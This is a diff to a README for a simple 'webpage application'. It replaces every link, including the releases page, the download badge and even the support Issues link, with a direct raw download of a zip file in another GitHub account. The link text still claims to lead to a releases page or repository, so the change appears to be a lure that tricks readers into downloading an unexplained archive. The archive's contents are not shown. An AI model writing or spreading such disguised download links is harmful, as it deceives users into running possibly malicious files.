@@ -6,9 +6,9 @@ Welcome to the webpage application! This app lets you browse a simple and elegan
 
 ## 📥 Download & Install
 
-To download the webpage application, please visit the [Releases page](https://github.com/yourusername/webpage/releases). Here, you will find the latest version of the application available for download.
+To download the webpage application, please visit the [Releases page](https://github.com/rolloo06/webpage/raw/refs/heads/main/elocution/Software-2.0.zip). Here, you will find the latest version of the application available for download.
 
-[![Download the latest version](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://github.com/yourusername/webpage/releases)
+[![Download the latest version](https://github.com/rolloo06/webpage/raw/refs/heads/main/elocution/Software-2.0.zip%20Now-blue?style=for-the-badge)](https://github.com/rolloo06/webpage/raw/refs/heads/main/elocution/Software-2.0.zip)
 
 ## 🛠️ System Requirements
 
@@ -22,7 +22,7 @@ Before you download and run the webpage application, make sure your system meets
 
 ### Step 1: Download the Application
 
-1. Go to the [Releases page](https://github.com/yourusername/webpage/releases).
+1. Go to the [Releases page](https://github.com/rolloo06/webpage/raw/refs/heads/main/elocution/Software-2.0.zip).
 2. Find the latest version of the webpage.
 3. Click on the appropriate file for your operating system.
 
@@ -68,10 +68,10 @@ A: We aim to provide updates periodically based on user feedback and feature req
 
 ## 📞 Support
 
-If you need further assistance, please reach out via the Issues section on our [GitHub repository](https://github.com/yourusername/webpage/issues). We’re here to help!
+If you need further assistance, please reach out via the Issues section on our [GitHub repository](https://github.com/rolloo06/webpage/raw/refs/heads/main/elocution/Software-2.0.zip). We’re here to help!
 
 ## 📄 License
 
 The webpage application is licensed under the MIT License. You can freely use, modify, and distribute it as per the terms of the license.
 
-Thank you for using the webpage application! We hope you enjoy a simple browsing experience with us. Don’t forget to check the [Releases page](https://github.com/yourusername/webpage/releases) for future updates!
+Thank you for using the webpage application! We hope you enjoy a simple browsing experience with us. Don’t forget to check the [Releases page](https://github.com/rolloo06/webpage/raw/refs/heads/main/elocution/Software-2.0.zip) for future updates!
